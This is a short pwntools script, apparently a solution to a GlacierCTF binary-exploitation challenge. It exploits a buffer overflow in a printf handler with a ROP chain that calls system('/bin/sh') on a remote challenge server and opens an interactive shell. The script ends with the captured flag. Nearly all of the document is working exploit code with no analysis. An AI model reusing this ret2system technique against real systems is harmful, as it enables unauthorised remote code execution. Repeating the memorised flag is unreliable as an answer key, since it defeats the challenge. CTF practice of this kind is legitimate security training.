from pwn import *


# buffer overflow in the printf_handler => 0x401845

padd = 85
pop_rdi_ret  = 0x0000000000402188 #: pop rdi; ret; 
binsh_add  =  0x000000000478010
system_add = 0x000000000404AFB
#p =process('./chall_')
p =remote("chall.glacierctf.com",13392)
payload = b'A'*padd
payload += p64(pop_rdi_ret)
payload += p64(binsh_add)
payload += p64(system_add)

p.sendline(payload)
p.interactive()


# gctf{l0ssp34k_UwU_L0v3U}